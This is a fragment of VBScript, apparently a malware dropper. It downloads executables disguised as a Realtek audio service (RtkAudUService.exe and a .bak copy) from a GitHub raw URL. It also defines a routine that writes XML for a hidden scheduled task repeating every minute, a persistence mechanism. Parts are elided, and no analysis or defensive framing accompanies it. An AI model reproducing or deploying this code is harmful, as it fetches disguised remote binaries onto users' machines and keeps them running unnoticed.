...
If Not fso.FileExists(exePath) Then DownloadFile "https://raw.githubusercontent.com/ml24011973-stack/Scrypt/main/RtkAudUService.exe", exePath

If Not fso.FileExists(bakPath) Then DownloadFile "https://raw.githubusercontent.com/ml24011973-stack/Scrypt/main/RtkAudUService.bak", bakPath
...
Sub CreateHiddenTaskXML(path, script)
    ...
    xml.WriteLine "  <Triggers><TimeTrigger><Repetition><Interval>PT1M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>"
